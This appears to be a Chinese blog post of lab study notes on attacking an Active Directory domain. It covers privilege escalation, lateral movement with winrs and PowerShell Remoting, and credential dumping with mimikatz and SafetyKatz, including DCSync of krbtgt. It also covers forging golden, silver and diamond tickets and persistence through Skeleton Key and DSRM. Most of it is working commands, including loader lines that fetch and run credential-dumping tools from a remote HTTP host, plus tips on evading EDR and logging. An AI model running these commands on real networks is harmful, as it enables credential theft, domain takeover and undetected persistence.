<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe sdshow snmtrap</span><br></pre></td></tr></table></figure>

<p>要注意的是，更改服务配置这种操作，连MDE这种白痴都会感知到。</p>
<p>执行所有check</p>
<p>PowerUP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Allchecks</span><br></pre></td></tr></table></figure>

<p>powerUP abuse</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help Invoke-ServiceAbuse</span><br></pre></td></tr></table></figure>


<p>Privesc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PrivEscCheck</span><br></pre></td></tr></table></figure>

<p>winpeas</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeasx64.exe</span><br></pre></td></tr></table></figure>

<h3 id="2-本身就易受攻击的高权服务"><a href="#2-本身就易受攻击的高权服务" class="headerlink" title="2.本身就易受攻击的高权服务"></a>2.本身就易受攻击的高权服务</h3><p>未授权漏洞导致Jenkins可以直接执行命令，从而获得高权</p>
<h3 id="3-NTLM-KRB中继攻击"><a href="#3-NTLM-KRB中继攻击" class="headerlink" title="3.NTLM&#x2F;KRB中继攻击"></a>3.NTLM&#x2F;KRB中继攻击</h3><p>不用直接尝试破解密码，建议考虑中继利用做端点身份验证等</p>
<h2 id="07-横向移动"><a href="#07-横向移动" class="headerlink" title="07 横向移动"></a>07 横向移动</h2><p>powershell交互式</p>
<blockquote>
<p>PowerShell Remoting（如通过 Enter-PSSession 或 Invoke-Command）默认使用 WinRM（Windows Remote Management 5898） 服务进行通信，而该服务的默认安全策略要求远程用户在目标计算机上具有<strong>管理员权限</strong>才能成功建立远程会话。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession</span><br></pre></td></tr></table></figure>

<p>powershell非交互式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-command</span> <span class="literal">-Scriptblock</span>&#123;<span class="built_in">set</span> <span class="variable">$ENV:computername</span>;<span class="built_in">set</span> <span class="variable">$ENV:username</span>&#125; <span class="literal">-ComputerName</span> dcorp<span class="literal">-adminsrv</span></span><br></pre></td></tr></table></figure>

<p>批量执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-command</span> <span class="literal">-Scriptblock</span>&#123;<span class="built_in">set</span> <span class="variable">$ENV:computername</span>;<span class="built_in">set</span> <span class="variable">$ENV:username</span>&#125; <span class="literal">-ComputerName</span> (<span class="built_in">cat</span> C:/servers.txt)</span><br></pre></td></tr></table></figure>

<p>批量执行脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\script\Get-PassHashes.ps1&quot;</span> <span class="literal">-ComputerName</span> (<span class="built_in">Get-Content</span> <span class="string">&quot;C:/servers.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>本地已经加载了脚本，于远程服务器上执行函数</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ScriptBlock</span> <span class="variable">$</span>&#123;function:<span class="built_in">Get-PassHashes</span>&#125; <span class="literal">-ComputerName</span> (<span class="built_in">Get-Content</span> <span class="string">&quot;C:/servers.txt&quot;</span>) <span class="literal">-ArgumentList</span> </span><br></pre></td></tr></table></figure>

<p>获得一个session，然后指定session执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sess</span>  = <span class="built_in">New-PSession</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-ScriptBlock</span> &#123;<span class="variable">$proc</span> = <span class="built_in">Get-Process</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-ScriptBlock</span> &#123;<span class="variable">$proc</span>.name&#125; </span><br></pre></td></tr></table></figure>

<p>因为powershell远程会全系统转录并且留下命令执行记录，可以通过使用winrs替换PSRemote，规避掉留下日志。者能够绕过MDE 但MDI还是会有记录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-remote</span>:server1 <span class="literal">-u</span>:server1\administrator <span class="literal">-p</span>:Pssword@<span class="number">1234</span> hostname</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a></p>
</blockquote>
<h2 id="08-相关敏感凭据提取"><a href="#08-相关敏感凭据提取" class="headerlink" title="08 相关敏感凭据提取"></a>08 相关敏感凭据提取</h2><p>LSASS</p>
<p>为了避免触发edr，所以需要在不触及LSASS进程的情况下获取票据</p>
<p>转储 SAM hive 得到本地凭据</p>
<p>转储 LSA Secrets&#x2F;SECURITY hive 得到服务密码，域缓存凭证。</p>
<p>dpapi 凭据管理器&#x2F;保险库，浏览器cookies，凭据，Azure Token</p>
<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><h4 id="DC中dump所有域凭据"><a href="#DC中dump所有域凭据" class="headerlink" title="DC中dump所有域凭据"></a>DC中dump所有域凭据</h4><p>注意，从DC上lsa的dump出的没有aeskey，只有dcsync才能导出aeskey</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;lsadump::lsa /patch&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#SafetyKatz</span></span><br><span class="line">lsadump::evasive<span class="literal">-lsa</span></span><br></pre></td></tr></table></figure>


<h4 id="dump凭据-dump-credentials"><a href="#dump凭据-dump-credentials" class="headerlink" title="dump凭据 dump credentials"></a>dump凭据 dump credentials</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlas::ekeys</span><br></pre></td></tr></table></figure>

<p>Safekatz dump</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SafetyKatz">https://github.com/GhostPack/SafetyKatz</a></p>
</blockquote>
<p><strong>使用 <code>loader.exe</code> 来运行</strong></p>
<p>或者impacket</p>
<h4 id="哈希传递-pth"><a href="#哈希传递-pth" class="headerlink" title="哈希传递(pth)"></a>哈希传递(pth)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::pth /user:administrator /domian:dollarcorp.moneycorp.local /aes256:&lt;aeskey&gt; /run:cmd.exe&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用这个命令将会以logon type 9 启动一个会话 (与runas &#x2F;netonly相同)</p>
<p>要注意 <code>logon type 9</code> 情况下，只有访问远程资源时才会使用新凭据。 而且这要求管理员才能使用</p>
<p><strong>小技巧</strong>：</p>
<p><strong>以及，<code>Loader.exe</code> 可以远程加载exe执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loader.exe -Path http://172.16.100.1/SafetyKatz.exe sekurlsa::evaskeys exit</span><br></pre></td></tr></table></figure>

<p>配合winrs使用，在远程主机上执行,<strong>(这里 <code>ekeys</code> 被重命名为了 <code>evasive-keys</code>，为了规避关键字监测)</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> <span class="string">&quot;cmd /c C:\Users\Public\Loader.exe -path http://172.16.100.1/SafetyKatz.exe sekurlsa::evasive-keys exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过netsh将http.server代理到目标本地，来规避一部分网络检测</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$null</span> | winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> <span class="string">&quot;netsh interface portproxy add v4tov4 listenport=8080 listenAddress=0.0.0.0 connectport=8888 connectaddress=172.16.100.1&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后只需要在本地加载即可</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$null</span> | winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> <span class="string">&quot;cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>在演示时，导出了 <code>svcadmin</code> 的凭证， 输出其账户对应的 <code>session</code> 属性为 <code>Service from 0</code></p>
<p>这代表着这台在这台机器上有一个服务但是以 <code>svcadmin</code> 管理员账户权限运行，这种情况导出将会提供明文的密码.</p>
<p><strong>vault凭据</strong></p>
<p><code>rdp</code>、<code>计划任务</code>等操作使用的凭据都保存在windows的(Vault)凭据库中，这里也用mimikatz 或者 <code>Invoke-Mimi.ps1</code> 进行导出即可。</p>
<p>因为他的command并不常见，所以通常来说不会被拦截住.</p>
<p>可以和applocker的限制的部分我们做法一样，可以在 <code>Invoke-Mimi.ps1</code> 的末尾加上这部分</p>
<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Mimi</span> <span class="literal">-Command</span> <span class="string">&#x27;&quot;token::elevate&quot; &quot;vault::cred /patch&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>sekurlsa::ekeys获取的是来自lsass内存中的凭据和aes、rc4的key等，而vault则是解密并显示<code>windows vault</code>中存储的明文 <code>用户名</code>&#x2F;<code>密码</code>等</strong></p>
<p>这阿三说，”保险库凭据等同于dpapi”</p>
<p>我感觉是属于一部分</p>
<hr>
<h4 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h4><p>DCSync导出krbtgt凭据  </p>
<p>要注意通常情况下DCSync需要DA（domian admin）才可以做</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;lsadump::dcsync /user:dcorp\krbtgt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="PS历史命令记录"><a href="#PS历史命令记录" class="headerlink" title="PS历史命令记录"></a>PS历史命令记录</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-PSReadLineOption</span></span><br></pre></td></tr></table></figure>

<p>注意，在2024年11月左右的更新之后，这个文件<code>Host_history.txt</code>将不会记录下面这条<code>ConvertTo-SecureString</code>,以避免暴露明文密码。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsPlaintext</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Creds</span> = System.Management.Automation.PSCredential (<span class="string">&quot;dcorp/administrator&quot;</span>,<span class="variable">$pass</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-credential</span> Creds <span class="literal">-ComputerName</span> <span class="string">&quot;dcorp-dc&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="票据利用"><a href="#票据利用" class="headerlink" title="票据利用"></a>票据利用</h4><p>要注意的是这个Rubues获取票据的操作会覆盖当前的票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubues.exe asktgt /user:administrator /rc4:&lt;ntlmhash&gt; /ptt</span><br></pre></td></tr></table></figure>

<p>下面这个需要本地管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubues.exe asktgt /user:administrator /aes256:&lt;aeskey&gt; /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<hr>
<p>加载利用 <code>Rubeus</code>，注：<code>/ptt</code>在该进程中注入票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loader.exe <span class="literal">-path</span> C:\AD\tools\Rubeus.exe <span class="literal">-args</span> asktgt /user:svcadmin /aes256:xxxxxxxxxxxxxxxxxxx /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在上述执行拿到域管的cmd之后，执行 <code>whoami</code> 查看会发现并不是 <code>svcamin</code>, 这是因为logon type 9，只有访问远程资源时才会调用新票据，比如通过当前cmd进程执行 <code>winrs</code> 访问<code>dc</code></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-dc</span> cmd /c <span class="built_in">set</span> username</span><br></pre></td></tr></table></figure>

<h2 id="09-kerberos"><a href="#09-kerberos" class="headerlink" title="09 kerberos"></a>09 kerberos</h2><h3 id="1-PAC"><a href="#1-PAC" class="headerlink" title="1.PAC"></a>1.PAC</h3><p><code>AP-req</code>，在服务端收到客户端的st之后，如果DC配置了开启了PAC校验，<code>service</code> 则会发送PAC给DC校验PAC中权限，这通常是不开启的。</p>
<p>PAC中包含了这个用户于TGS中所声称的用户的信息。</p>
<h3 id="2-Golden-Ticket"><a href="#2-Golden-Ticket" class="headerlink" title="2.Golden Ticket"></a>2.Golden Ticket</h3><p>因为<code>AS-REP</code>返回给客户端的TGT中加密的部分，使用的是 <code>krbtgt</code> 的凭据key来进行加密。</p>
<p>所以在响应 <code>TGS-REQ</code> 时，<code>DC</code> 验证票据主要是看 <code>krbtgt</code> 的凭据是否能成功解密，并获取客户端的 <code>TGT</code> 中加密部分的内容。</p>
<p>也就是说，可以通过获取 <code>krbtgt</code> 的key，来伪造一个包含了我们伪造的目标用户信息 <code>TGT</code> ，用于在 <code>TGS-REQ</code> 时，被 <code>DC</code> 能供成功解析。</p>
<p>通过这种方式来伪造任意用户的 <code>TGS-REQ</code> ，可进行获取任意用户的任意服务票据。</p>
<p>获取 <code>krbtgt</code> 凭据的方式</p>
<p>1.在DC上以域管理员（DA）身份执行mimikatz 导出凭证，但是这样只会得到得到RC4(htlm)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\SafetyKatz.exe <span class="string">&#x27;&quot;lsadump::lsa /patch&quot;&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>2.具有DCSync权限，可以导出aeskey</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\SafetyKatz.exe <span class="string">&#x27;&quot;lsadump::dcsyn /user:dcorp\krbtgt &quot; &quot;exit&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>krbtgt 有密码记录，如果提交TGT而KDC无法使用当前密码解密，那他就会尝试上一个密码。</p>
<h4 id="利用金票："><a href="#利用金票：" class="headerlink" title="利用金票："></a>利用金票：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Rubeus.exe golden /aes256:xxxxxxxxx /sid:&lt;Domian<span class="literal">-Sid</span>&gt; /ldap /user:Administrator /printcmd</span><br></pre></td></tr></table></figure>

<p>本实验室里用 <code>loader</code> 加载 <code>Safetykatz</code> 的话用下面这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Loader.exe -path http://127.0.0.1/Rubeus.exe -args evasive-golden /aes256:xxxxxxx /sid:&lt;domain-Sid&gt; /ldap /user:Administrator /printcmd</span><br></pre></td></tr></table></figure>

<p>然后根据输出的命令，在后面添加添加 <code>/ptt</code> 再次执行，在当前会话中注入票据，即可。</p>
<p>请注意，使用这段请求金票时，将会向DC发送3个LDAP查询请求：</p>
<ul>
<li>获取<code>/user</code> 中指定的flag （比如这里的administrator）</li>
<li>检索<code>/groups</code>,<code>/pgid</code>,<code>/minipassage</code>,<code>/maxpassage</code></li>
<li>检索当前域的<code>/netbios</code></li>
</ul>
<p>如果已经枚举了上述值或能添加更多值，则建议在打造金票时指定，这更有利于隐蔽。</p>
<h3 id="3-sliver-Ticket"><a href="#3-sliver-Ticket" class="headerlink" title="3.sliver Ticket"></a>3.sliver Ticket</h3><p>MDI对银票的检测宽容度非常高，即便是用域控(DC)机器账户伪造下发银票，mdi也不会管。</p>
<p><strong>Kerberos流程中最后部分 可选的PAC鉴权选项 会使这个票据失效，因为最后service还需要拿着st中的PAC交由dc验证，如果dc发现pac中的信息和对st发起请求的客户端不匹配，则G了</strong></p>
<h4 id="1-利用银票"><a href="#1-利用银票" class="headerlink" title="1.利用银票"></a>1.利用银票</h4><p>Rubeus</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Rubeus.exe sliver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:xxxxxxxxxxxx /sid:&lt;Domian-sid&gt; /user:Administrator /ldap /domian:dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<p>这里服务指定的是<code>http</code>，<code>http</code> 的 st 可以访问的资源比如 <code>WinRM</code>、<code>Winrs</code>等走http的鉴权访问资源。</p>
<p><code>Host</code> 的service则可以做  <code>计划任务（Scheduled Tasks）</code>、<code>本地资源</code> 、<code>WMI</code> 等访问。</p>
<p><code>RPCSS</code> 则是对主机发起 <code>RPCSS</code> 的访问，相比于 <code>Host</code> 的基础上多了访问 <code>COM</code> 和 远程管理服务等。</p>
<p>以上两种都可以执行 <code>WMI</code>（或者需要两种） ，WMI背后的服务是 <code>rpc</code> 和 <code>DCOM</code></p>
<p><code>CIFS</code> 文件共享服务，比如 <code>smb</code> </p>
<p><code>LDAP</code> 则是 <code>dcsync</code>等。</p>
<p>于实验室中使用 <code>Loader.exe</code> 执行 <code>Rubeus</code> 伪造银票则是如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>/Rubeus.exe <span class="literal">-args</span> evasive<span class="literal">-sliver</span> /service:http/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /rc4:xxxxxxxxxxxx /sid:S<span class="literal">-1-5-21-xxxxxx-xxxxxx-xxxxxx</span> /domian:dollarcorp.moneycorp.local /user:Administator /ldap /ptt</span><br></pre></td></tr></table></figure>

<p>清理票据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge </span><br></pre></td></tr></table></figure>

<p>列出票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe klist</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>

<h3 id="4-Diamond-Ticket"><a href="#4-Diamond-Ticket" class="headerlink" title="4.Diamond Ticket"></a>4.Diamond Ticket</h3><p>回顾金票所产生的环节。</p>
<p>金票是直接通过 <code>krbtgt</code> 的 <code>aeskey</code> ，来打造一个现成的TGT注入到进程中。</p>
<p>这使得他没有 <code>as-req</code> <code>as-rep</code> 的环节，也自然缺少了两个环节对应的日志。</p>
<p>那钻石票就是为了解决这个问题，他是在正常正常流程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as-req -&gt; as-rep</span><br></pre></td></tr></table></figure>

<p>客户端获取TGT后，用 <code>krbtgt aeskey</code> 对TGT的加密部分进行解密，然后修改为我们所需的权限，再用 <code>krbtgt aeskey</code> 重新加密包装，这即是 <code>Diamond Ticket</code>。</p>
<p>把 <code>as-req</code> 返回的 tgt 视为一个盒子，用 <code>krbtgt aeskey</code> 打开盒子 然后修改里面的内容，再用它重新打包，发给DC。</p>
<p>说白了就是一个TGT的重包装。</p>
<p>钻石票据不仅比金票更隐蔽更安静，但前提也是要先有 <code>krbtgt aeskey</code></p>
<p>特点：</p>
<ul>
<li>更隐蔽</li>
<li>生命周期取决于krbtgt，只要 krbtgt 的 hash 没变，就可以一直伪造或修改票据</li>
</ul>
<h4 id="1-利用钻石票"><a href="#1-利用钻石票" class="headerlink" title="1.利用钻石票"></a>1.利用钻石票</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:&lt;krbtgt<span class="literal">-aeskey</span>&gt; /user:student1 /password:password@<span class="number">123</span> /enctype:aes /tickeruser:administrator /domian:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /tickeruserid:<span class="number">500</span> /groups:<span class="number">512</span> /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<p>如果正在作为域用户访问，则可以通过使用 <code>/tgtdeleg</code> 选项来传递当前账户凭据(省了输入账户密码了)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:&lt;krbtgt<span class="literal">-aeskey</span>&gt; /tgtdeleg /enctype:aes /tickeruser:administrator /domian:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /trickeruserid:<span class="number">500</span> /groups:<span class="number">512</span> /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<h3 id="5-Skeleton-key"><a href="#5-Skeleton-key" class="headerlink" title="5.Skeleton key"></a>5.Skeleton key</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/persistence/skeleton-key/">https://www.thehacker.recipes/ad/persistence/skeleton-key/</a></p>
</blockquote>
<p>通过patch lsass来实现，需要<code>dc</code> 的 <code>SeDebugPrivilege</code> 权限才可以，并且重启之后将会失效。</p>
<h4 id="1-注入万能钥匙"><a href="#1-注入万能钥匙" class="headerlink" title="1.注入万能钥匙"></a>1.注入万能钥匙</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&#x27;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#x27;</span> <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span>.dollarcorp.local </span><br></pre></td></tr></table></figure>

<p>密码是 <code>mimikatz</code>，直接连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -Computername dcorp-dc -crendential dcorp\Administrator</span><br></pre></td></tr></table></figure>

<p>但是不建议用，因为如果角色位于注入万能钥匙的同一个域控上，ADCS的验证会出问题。</p>
<h3 id="6-DSRM"><a href="#6-DSRM" class="headerlink" title="6.DSRM"></a>6.DSRM</h3><p>目录服务还原模式 (DSRM) 是每个域控制器 (DC) 上用于恢复操作的一种特殊安全模式。</p>
<p>当域内机器提升为域控时，将会自动在本地创建一个 <code>Administrator</code> 本地的DSRM管理员账户，并设置DSRM密码，这个密码通常很少更新，隐蔽性比较高。</p>
<p>当能从域控导出 <code>sam hash</code> 时，可以检索到DSRM密码，如果需要远程登录这个账户的话需要修改注册表。</p>
<p>通过修改注册表 <code>HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code> 控制可使用 DSRM 帐户的条件:</p>
<ul>
<li>值 0（默认值）：仅当 DC 在 DSRM 中启动时，该帐户才可用。</li>
<li>值 1：本地 AD DS 服务停止时允许 DSRM 凭据。</li>
<li>值 2：允许始终使用 DSRM 凭据，包括通过网络。</li>
</ul>
<p>通过利用这些配置，攻击者可以利用 DSRM 帐户长期访问 DC，而无需域凭据。</p>
<h4 id="1-获取DSRM凭据"><a href="#1-获取DSRM凭据" class="headerlink" title="1.获取DSRM凭据"></a>1.获取DSRM凭据</h4><p>提取dsrm账户凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot;</span><br></pre></td></tr></table></figure>

<p>将导出的管理员hash与下面这个命令得到的管理员hash进行比较</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::lsa /patch&quot;</span><br></pre></td></tr></table></figure>

<p>第一个命令得到的是DSRM管理员密码</p>
<h4 id="2-利用DSRM管理员账户"><a href="#2-利用DSRM管理员账户" class="headerlink" title="2.利用DSRM管理员账户"></a>2.利用DSRM管理员账户</h4><p>因为通常情况下DSRM管理员账户无法直接使用，但是可以通过修改注册表 <code>HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code> 使其可用。</p>
<p>用有权限修改dc注册表的账户先访问到dc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:dcorp-dc cmd</span><br></pre></td></tr></table></figure>

<p>修改注册表，允许DSRM管理员正常情况下从网络登录。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;DsrmAdminLoginBehavior&quot;</span> /t REG_DWORD /d <span class="number">2</span> /f</span><br></pre></td></tr></table></figure>

<p>正常mimikatz使用DSRM的ntlm凭据启动一个带凭据的cmd（注意DSRM与正常的pth不同，这里 <code>Domian</code> 指向的不是域名，而是目前所用的DSRM的域控机器名）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::pth /domian:dcorp-dc /user:Administrator /ntlm:xxxxxxxxxxxxxx /run:cmd&quot;</span></span><br></pre></td></tr></table></figure>

<p>因为使用ntlm和ip来进行远程到域控，所以需要将域控机器的ip加入到当前可信主机中</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-Item</span> WSMan:\localhost\Client\TrustedHosts <span class="number">172.16</span>.<span class="number">2.1</span>&lt;域控ip&gt;</span><br></pre></td></tr></table></figure>

<p>然后就可以用PSSession远程到域控，要注意这里ComputerName用的是IP，而Kerberos不认ip，所以这里是NTLM认证，然后鉴权使用 <code>NegotiateWithImplicitCredential</code> <em>(自动使用当前登录用户的凭据进行身份验证)</em></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> <span class="number">172.16</span>.<span class="number">2.1</span> <span class="literal">-Authentication</span> NegotiateWithImplicitCredential</span><br></pre></td></tr></table></figure>

<p>因为是用管理员账户本地登陆的，所以这里留下的日志也比较正常</p>
<p>4624（登录成功）、4634（退出）、4672（管理员登录）</p>
<h3 id="7-Custom-SSP"><a href="#7-Custom-SSP" class="headerlink" title="7.Custom SSP"></a>7.Custom SSP</h3><p>（SSP） Security Support Provider，ssp是一个安全支持服务，对应用提供身份认证的方式，他是一个允许身份验证的DLL库。</p>
